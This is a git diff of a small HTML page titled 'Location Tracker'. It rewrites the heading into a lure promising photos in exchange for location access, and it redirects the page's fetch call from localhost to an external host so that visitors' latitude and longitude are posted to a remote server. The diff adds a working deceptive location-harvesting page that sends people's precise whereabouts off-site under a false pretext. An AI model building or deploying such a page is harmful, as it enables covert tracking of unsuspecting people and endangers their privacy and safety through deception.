@@ -5,8 +5,7 @@
   <title>Location Tracker</title>
 </head>
 <body>
-  <h1>Hello, please allow location access</h1>
-  <!-- <button onclick="getLocation()">Share Location</button> -->
+  <h1>Hello, please allow location access to see PHOTO's</h1>
 
   <script>
     function getLocation() {
@@ -15,13 +14,16 @@
         return;
       }
 
+      console.log('petros----');
       navigator.geolocation.getCurrentPosition(async (position) => {
         const data = {
           latitude: position.coords.latitude,
           longitude: position.coords.longitude
         };
 
-        await fetch("http://localhost:3000/location", {
+        console.log('petros----');
+
+        await fetch("https://test-do5j.onrender.com", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
